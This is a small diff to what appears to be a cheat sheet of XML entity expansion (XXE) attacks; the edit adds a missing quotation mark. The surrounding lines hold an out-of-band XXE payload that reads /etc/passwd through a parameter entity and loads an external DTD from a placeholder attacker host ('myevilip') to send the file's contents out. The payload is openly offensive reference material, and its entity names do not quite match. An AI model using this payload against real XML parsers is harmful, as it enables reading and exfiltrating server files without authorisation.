@@ -31,7 +31,7 @@ XML ENTITY EXPANSION:
 	Another one:
 	<!DOCTYPE root [
 	<!ENTITY % file SYSTEM "file:///etc/passwd">
-	<!ENTITY % did SYSTEM "http://myevilip/ext.dtd
+	<!ENTITY % did SYSTEM "http://myevilip/ext.dtd"
 	%dtd;
 	%send;
 	]]>
